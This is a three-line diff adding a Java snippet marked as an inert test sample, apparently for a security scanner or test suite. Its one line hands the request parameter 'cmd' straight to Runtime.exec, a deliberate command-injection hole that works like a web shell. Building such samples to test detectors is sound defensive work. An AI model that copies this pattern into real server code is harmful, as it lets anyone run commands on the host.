@@ -1,0 +1,3 @@
+// INERT TEST SAMPLE
+Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
+
